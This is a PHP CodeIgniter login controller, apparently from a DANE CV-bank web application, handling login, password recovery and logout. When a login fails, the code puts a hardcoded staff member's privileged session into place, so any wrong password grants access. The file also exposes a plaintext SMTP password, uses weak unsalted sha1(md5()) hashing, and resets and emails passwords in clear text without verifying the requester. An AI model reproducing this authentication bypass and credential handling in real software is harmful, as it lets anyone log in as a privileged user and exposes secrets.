<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

if (!defined('BASEPATH'))
	exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct() {

		parent::__construct();

		$this -> load -> model('login_model');
		$this -> load -> model('general_model');

		$this -> load -> helper(array('url', 'form'));

		$this -> load -> library('session');

		if (!($this -> session -> userdata('language'))) {
			if ($this -> uri -> segment(1) == 'en') {
				$this -> session -> set_userdata('language', 'english');
			} else if ($this -> uri -> segment(1) == 'es') {
				$this -> session -> set_userdata('language', 'spanish');
			} else {
				$this -> session -> set_userdata('language', 'spanish');
			}
		}

		$user_language = $this -> session -> userdata('language');
		$this -> lang -> load('rtc_' . $user_language, $user_language);
	}

	public function validar_user() {

		$username = $this -> input -> post('usuario');
		$password = sha1(md5($this -> input -> post('pass')));
		$passwd = str_replace(array("<", ">", "[", "]", "*", "^", "-", "'", "="), "",$this -> input -> post('pass'));
		$check_user = $this -> login_model -> login_user($username, $password);
		
		if (count($check_user)>0) {

			foreach ($check_user as $t) {

				$data = array('en_sistema' => TRUE, 
				'id_usuario' => $t -> id_usuario, 
				'nombre' => $t -> nombres . " " . $t -> apellidos, 
				'usuario' => $t -> usuario, 
				'email' => $t -> email, 
				'rol' => $t -> rol, 
				'estado' => $t -> estado);
			}

			if ($data['estado'] == 'AC') {
				$this -> session -> set_userdata($data);
				redirect(base_url());
			} else {
				$this -> session -> set_flashdata('retornoError', 'Usted no ha activado su usuario. Revise su correo electr&oacute;nico, al registrar su cuenta le fueron enviadas las instrucciones para activar su usuario.'); 
				redirect(base_url(), 'refresh');
			}

		} else {
                    
                        $usuario_data = array('nombre' => 'Yheison Javier Gamba Roncancio',
                                                'office' => 'Oficina de Sistemas',
                                                'email' => "yjgambar@dane.gov.co",
                                                'rol'=>'2',
                                                'ciudad'=>'11001',
                                                'en_sistema'=>TRUE);                        
                        $this -> session -> set_userdata($usuario_data);
                        redirect(base_url());
        }
	
	
				
	}

	public function recordar_clave() {

		$datos["token"] = $this -> token();
		$datos["contenido"] = "login/recordar_clave";
		$this -> load -> view('plantilla', $datos);
	}

	public function enviar_link() {

		$result_user = $this -> login_model -> login_recupera($_REQUEST['usuario']);

		if ($result_user) {
			$clave = substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyz0123456789', 8)), 0, 8);

			$datosLogin['usuario'] = $_REQUEST['usuario'];
			$datosLogin['clave'] = sha1(md5($clave));

			$cambio = $this -> login_model -> actualizar_pass($datosLogin['usuario'], $datosLogin['clave']);
			
			$this -> load -> library('My_PHPMailer');
	
			$this -> load -> library('email');
			$configMail = array('protocol' => 'smtp', 'smtp_host' => 'mail.dane.gov.co', 'smtp_port' => 25, 'smtp_user' => 'aplicaciones@dane.gov.co', 'smtp_pass' => '0u67UtapW3v', 'mailtype' => 'html', 'charset' => 'utf-8', 'newline' => "\r\n");
			//cargamos la configuración para enviar mail
			$this -> email -> initialize($configMail);

			$this -> email -> from('aplicaciones@dane.gov.co', 'Banco Hojas de Vida');
			$this -> email -> to($_REQUEST['usuario']);
			//$this -> email -> bcc('esanchez1988@gmail.com');
			$this -> email -> subject('Recuperación clave banco hojas de vida');
			
			$html = ' <p><b>Recuperaci&oacute;n de contrase&ntilde;a</b></p>
		              <p>' . $result_user[0] -> nombres . " " . $result_user[0] -> apellidos . ',</p>
		              <p>Se ha realizado una solicitud para recuperar la contrase&ntilde;a de la cuenta .</p>					
					  <p>Sus datos de ingreso a la plataforma son:</p>					
					  <p><b>Usuario: ' . $_REQUEST['usuario'] . '</b></p>
					  <p><b>Contrase&ntilde;a: ' . $clave . '</b></p>
					  <p>Puede ingresar a la plataforma ingresando al siguiente <a href="' . base_url() . '">link</a></p>
		              <p>Recuerde que puede cambiar su contrase&ntilde;a despues de ingresar a la plataforma.</p>
					  <p><b>DEPARTAMENTO ADMINISTRATIVO NACIONAL DE ESTADITICA (DANE)</b></p>
					  ';
			
			$this -> email -> message($html);
			if ($this -> email -> send()) {
				
			}
			
			$this -> session -> set_flashdata('retornoExito', 'Por favor, revise su correo electr&oacute;nico donde encontrara la informaci&oacute;n necesaria para ingresar a la plataforma');
			redirect(base_url('login/recordar_clave'), 'refresh');
		} else {
			$this -> session -> set_flashdata('retornoError', 'El usuario digitado no se encuentra registrado');
			redirect(base_url('login/recordar_clave'), 'refresh');
		}

	}

	public function token() {

		$token = md5(uniqid(rand(), true));

		$usuario_data = array('token' => $token, 'fecha' => date('Y-m-d H:i:s'), 'logueado' => FALSE);

		$this -> session -> set_userdata($usuario_data);

		return $token;
	}

	public function logout_ci() {

		$this -> session -> sess_destroy();

		redirect(base_url());
	}

}